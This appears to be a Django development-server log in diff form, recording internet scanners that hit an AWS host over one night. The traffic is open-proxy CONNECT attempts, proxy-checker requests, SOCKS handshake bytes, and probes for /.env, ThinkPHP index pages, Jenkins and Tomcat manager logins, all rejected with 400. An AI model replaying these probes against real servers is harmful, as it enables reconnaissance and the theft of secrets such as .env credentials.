+[14/Jan/2021 23:08:20] code 400, message Bad request syntax ('\x04\x01\x00P%\x01ß)\x00')
+[14/Jan/2021 23:08:20] " P%ß) " 400 -
+[14/Jan/2021 23:08:45] code 400, message Bad request syntax ('\x05\x01\x00')
+[14/Jan/2021 23:08:45] " " 400 -
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 23:11:47] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[14/Jan/2021 23:21:30] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[14/Jan/2021 23:25:05] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+[14/Jan/2021 23:32:20] "GET /profile/ HTTP/1.1" 302 0
+[14/Jan/2021 23:32:21] "GET /login?next=/profile/ HTTP/1.1" 301 0
+[14/Jan/2021 23:32:22] "GET /login/?next=/profile/ HTTP/1.1" 200 2264
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 23:40:59] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[14/Jan/2021 23:43:22] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62511
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[14/Jan/2021 23:44:03] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[14/Jan/2021 23:50:03] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[14/Jan/2021 23:57:57] "GET / HTTP/1.1" 400 60957
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[14/Jan/2021 23:58:51] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 00:04:40] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[15/Jan/2021 00:05:22] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62509
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 00:12:38] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'chek.zennolab.com'. You may need to add 'chek.zennolab.com' to ALLOWED_HOSTS.
+Bad Request: /http:/chek.zennolab.com/proxy.php
+[15/Jan/2021 00:15:11] "GET http://chek.zennolab.com/proxy.php HTTP/1.1" 400 62523
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 00:15:13] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 00:20:52] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 00:27:30] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 00:27:50] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 00:35:29] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 00:40:45] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 00:43:09] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[15/Jan/2021 00:43:28] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62510
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 00:52:00] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 00:52:49] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 00:59:08] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 01:00:24] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[15/Jan/2021 01:05:20] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62510
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 01:10:36] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'mastak.ga'. You may need to add 'mastak.ga' to ALLOWED_HOSTS.
+Bad Request: /http:/mastak.ga/proxy-check.php
+[15/Jan/2021 01:12:09] "POST http://mastak.ga/proxy-check.php HTTP/1.1" 400 61511
+[15/Jan/2021 01:12:14] code 400, message Bad request syntax ('\x05\x01\x00')
+[15/Jan/2021 01:12:14] " " 400 -
+[15/Jan/2021 01:12:19] code 400, message Bad request syntax ('\x04\x01\x00P\\wqx\x00')
+[15/Jan/2021 01:12:19] " P\wqx " 400 -
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 01:15:30] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 01:22:19] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 01:22:31] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 01:30:48] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 01:36:52] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 01:43:23] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[15/Jan/2021 01:43:25] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62509
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 01:44:57] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 01:54:08] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 01:56:47] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /invoker/readonly
+[15/Jan/2021 02:00:53] "POST /invoker/readonly HTTP/1.1" 400 66880
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /.env
+[15/Jan/2021 02:03:20] "GET /.env HTTP/1.1" 400 61345
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Jan/2021 02:03:24] "POST / HTTP/1.1" 400 61628
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 02:04:23] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[15/Jan/2021 02:05:20] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62511
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 02:07:25] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+----------------------------------------
+Exception happened during processing of request from ('92.37.150.20', 64679)
+Traceback (most recent call last):
+  File "/usr/lib64/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib64/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib64/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/usr/local/lib64/python3.7/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/usr/local/lib64/python3.7/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib64/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 02:13:15] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /TP/public/index.php
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+[15/Jan/2021 02:16:32] "GET /TP/public/index.php HTTP/1.1" 400 61330
+Bad Request: /TP/index.php
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+[15/Jan/2021 02:16:32] "GET /TP/index.php HTTP/1.1" 400 61253
+Bad Request: /thinkphp/html/public/index.php
+[15/Jan/2021 02:16:32] "GET /thinkphp/html/public/index.php HTTP/1.1" 400 61451
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /html/public/index.php
+[15/Jan/2021 02:16:33] "GET /html/public/index.php HTTP/1.1" 400 61352
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /public/index.php
+[15/Jan/2021 02:16:33] "GET /public/index.php HTTP/1.1" 400 61297
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /TP/html/public/index.php
+[15/Jan/2021 02:16:33] "GET /TP/html/public/index.php HTTP/1.1" 400 61385
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /elrekt.php
+[15/Jan/2021 02:16:33] "GET /elrekt.php HTTP/1.1" 400 61231
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /index.php
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+Invalid HTTP_HOST header: 'work.a-poster.info:25000'. You may need to add 'work.a-poster.info' to ALLOWED_HOSTS.
+Bad Request: /http:/work.a-poster.info:25000/
+[15/Jan/2021 02:17:54] "POST http://work.a-poster.info:25000/ HTTP/1.1" 400 61703
+[15/Jan/2021 02:17:57] code 400, message Bad request syntax ('\x05\x01\x00')
+[15/Jan/2021 02:17:57] " " 400 -
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 02:20:09] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 02:20:18] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 02:27:46] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 02:33:29] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[15/Jan/2021 02:41:36] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62509
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 02:44:11] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 02:50:49] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 02:52:28] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Jan/2021 02:53:09] "GET / HTTP/1.1" 400 60956
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 02:55:07] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 03:03:38] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 03:05:40] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 03:11:02] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Jan/2021 03:15:55] "GET / HTTP/1.1" 400 61177
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 03:18:23] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 03:22:00] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /login
+[15/Jan/2021 03:22:01] "GET /login HTTP/1.0" 400 60878
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /jenkins/login
+[15/Jan/2021 03:22:02] "GET /jenkins/login HTTP/1.0" 400 60966
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /manager/html
+[15/Jan/2021 03:22:02] "GET /manager/html HTTP/1.0" 400 61113
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Jan/2021 03:25:19] "GET / HTTP/1.0" 400 61275
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 03:26:02] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 03:29:19] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 03:41:04] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 03:50:21] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: '110.242.68.4'. You may need to add '110.242.68.4' to ALLOWED_HOSTS.
+Bad Request: /http:/110.242.68.4/
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 03:52:42] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 03:55:23] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 03:57:16] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: '35.187.203.0:8070'. You may need to add '35.187.203.0' to ALLOWED_HOSTS.
+Bad Request: /http:/35.187.203.0:8070/ulabet-admin/index/test
+[15/Jan/2021 04:03:48] "GET http://35.187.203.0:8070/ulabet-admin/index/test HTTP/1.1" 400 62511
+Invalid HTTP_HOST header: 'mastak.ga'. You may need to add 'mastak.ga' to ALLOWED_HOSTS.
+Bad Request: /http:/mastak.ga/proxy-check.php
+[15/Jan/2021 04:04:02] "POST http://mastak.ga/proxy-check.php HTTP/1.1" 400 61511
+[15/Jan/2021 04:04:07] code 400, message Bad request syntax ('\x05\x01\x00')
+[15/Jan/2021 04:04:07] " " 400 -
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 04:04:12] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+[15/Jan/2021 04:04:12] code 400, message Bad request syntax ('\x04\x01\x00P\\wqx\x00')
+[15/Jan/2021 04:04:12] " P\wqx " 400 -
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 04:14:40] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 04:20:55] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 04:23:24] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 04:28:17] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'chekfast.zennolab.com'. You may need to add 'chekfast.zennolab.com' to ALLOWED_HOSTS.
+Bad Request: /http:/chekfast.zennolab.com/proxy.php
+[15/Jan/2021 04:28:33] "GET http://chekfast.zennolab.com/proxy.php HTTP/1.1" 400 62626
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /login
+[15/Jan/2021 04:29:28] "GET /login HTTP/1.0" 400 60882
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /jenkins/login
+[15/Jan/2021 04:29:29] "GET /jenkins/login HTTP/1.0" 400 60970
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /manager/html
+[15/Jan/2021 04:29:29] "GET /manager/html HTTP/1.0" 400 61117
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 04:30:19] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 04:37:19] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 04:39:12] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 04:49:18] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: '35.180.130.56'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /RbgB
+[15/Jan/2021 04:50:03] "HEAD /RbgB HTTP/1.1" 400 61347
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 04:54:15] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 04:56:51] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: '35.180.130.56:80'. You may need to add '35.180.130.56' to ALLOWED_HOSTS.
+Bad Request: /
+[15/Jan/2021 04:59:03] "GET / HTTP/1.1" 400 60936
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 05:04:53] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
+Invalid HTTP_HOST header: 'www.google.com'. You may need to add 'www.google.com' to ALLOWED_HOSTS.
+Bad Request: /www.google.com:443
+[15/Jan/2021 05:07:01] "CONNECT www.google.com:443 HTTP/1.1" 400 61206
+Invalid HTTP_HOST header: 'www.instagram.com'. You may need to add 'www.instagram.com' to ALLOWED_HOSTS.
+Bad Request: /www.instagram.com:443
+[15/Jan/2021 05:19:35] "CONNECT www.instagram.com:443 HTTP/1.1" 400 61284
+Invalid HTTP_HOST header: 'ip-172-31-18-224.eu-west-3.compute.internal'. You may need to add 'ip-172-31-18-224.eu-west-3.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /emalls.ir:443
+[15/Jan/2021 05:23:26] "CONNECT emalls.ir:443 HTTP/1.0" 400 60990
